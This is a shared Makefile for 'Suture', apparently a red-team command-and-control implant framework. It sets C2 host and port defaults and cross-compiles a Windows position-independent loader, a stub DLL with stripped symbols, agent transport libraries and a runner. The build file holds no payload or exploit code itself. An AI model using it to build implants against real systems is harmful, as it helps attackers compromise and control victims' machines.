# =============================================================================
# common.mk — Shared build configuration for Suture
# =============================================================================
#
# Include from any project Makefile:
#   ROOT := ..
#   include $(ROOT)/common.mk
# =============================================================================

# Toolchain
CC_64  := x86_64-w64-mingw32-gcc
CPL    := $(ROOT)/crystal-palace/cpl

# Defaults
C2_HOST    ?= 127.0.0.1
C2_PORT    ?= 9000
TRANSPORT  ?= tcp

# Shell / temp (MSYS2 compatibility)
SHELL := /bin/bash
export TMP   := /tmp
export TEMP  := /tmp
export TMPDIR := /tmp

# Compiler flags for PIC/PICO code
CFLAGS := -Os -fno-jump-tables -fno-builtin -mno-stack-arg-probe -shared -Wall -Wno-pointer-arith
CFLAGS += -fno-asynchronous-unwind-tables -fno-ident
CFLAGS += -ffunction-sections -fdata-sections
CFLAGS += -DC2_HOST=\"$(C2_HOST)\" -DC2_PORT=\"$(C2_PORT)\"

# Stub DLL linker flags
DLLFLAGS := -nostartfiles -nodefaultlibs -lkernel32
DLLFLAGS += -Wl,-e,DllMain -Wl,--gc-sections -Wl,--strip-all
DLLFLAGS += -Wl,--file-alignment,0x10 -Wl,--section-alignment,0x10
DLLFLAGS += -Wl,--exclude-all-symbols -Wl,--no-seh

# Framework paths (relative to project dir, ROOT must be set)
AGENT_SRC  := $(ROOT)/agent/src
AGENT_LIBS := $(ROOT)/agent/libs
BIN        := $(ROOT)/bin
TOOLS      := $(ROOT)/tools

# Transport source — selected by TRANSPORT variable
TRANSPORT_SRC = $(AGENT_LIBS)/LibWinTransport/src/transport_$(TRANSPORT).c

# =============================================================================
# Reusable build recipes — call from project Makefile
# =============================================================================

# Create bin directory
$(BIN):
	@mkdir -p $(BIN)

# Build core mergelibs (debug + transport + utils)
# Usage: $(call build_core_libs)
define build_core_libs
	@echo "[0/4] Building PICO mergelibs"
	@$(CC_64) -DWIN_X64 $(CFLAGS) \
		-c $(AGENT_LIBS)/LibDebug/src/debug.c -o $(BIN)/debug.x64.o
	@$(CC_64) -DWIN_X64 $(CFLAGS) \
		-c $(TRANSPORT_SRC) -o $(BIN)/transport.x64.o
	@$(CC_64) -DWIN_X64 $(CFLAGS) \
		-c $(AGENT_LIBS)/LibUtils/src/utils.c -o $(BIN)/utils.x64.o
	@python3 -c "\
import zipfile; \
z=zipfile.ZipFile('$(BIN)/libdebug.x64.zip','w'); z.write('$(BIN)/debug.x64.o','debug.x64.o'); z.close(); \
z=zipfile.ZipFile('$(BIN)/libtransport.x64.zip','w'); z.write('$(BIN)/transport.x64.o','transport.x64.o'); z.close(); \
z=zipfile.ZipFile('$(BIN)/libutils.x64.zip','w'); z.write('$(BIN)/utils.x64.o','utils.x64.o'); z.close()"
	@echo "    transport: $$(wc -c < $(BIN)/transport.x64.o)b  utils: $$(wc -c < $(BIN)/utils.x64.o)b"
endef

# Build PIC loader
# Usage: $(call build_loader)
define build_loader
	@$(CC_64) -DWIN_X64 $(CFLAGS) -c $(AGENT_SRC)/loader.c -o $(BIN)/loader.x64.o
endef

# Build stub DLL
# Usage: $(call build_stub)
define build_stub
	@echo "[2/4] Building stub DLL"
	@env TMP=/tmp TEMP=/tmp TMPDIR=/tmp \
		$(CC_64) -DWIN_X64 -Os -shared -Wall \
		-fno-asynchronous-unwind-tables -fno-ident \
		$(AGENT_SRC)/stub.c -o $(BIN)/stub.x64.dll $(DLLFLAGS)
endef

# Build runner
# Usage: $(call build_runner)
define build_runner
	@echo "[4/4] Building runner"
	@$(CC_64) -DWIN_X64 -masm=intel -Wall -Wno-pointer-arith \
		$(TOOLS)/run.c -o $(BIN)/run.x64.exe -lws2_32
endef

# Zip a single .o into a mergelib
# Usage: $(call zip_mergelib,name)  — expects $(BIN)/name.x64.o, creates $(BIN)/libname.x64.zip
define zip_mergelib
	@python3 -c "import zipfile; z=zipfile.ZipFile('$(BIN)/lib$(1).x64.zip','w'); z.write('$(BIN)/$(1).x64.o','$(1).x64.o'); z.close()"
endef

# Build LibCPLTest mergelib
# Usage: $(call build_cpltest_lib)
define build_cpltest_lib
	@$(CC_64) -DWIN_X64 $(CFLAGS) \
		-c $(AGENT_LIBS)/LibCPLTest/src/cpltest.c -o $(BIN)/cpltest.x64.o
	$(call zip_mergelib,cpltest)
endef
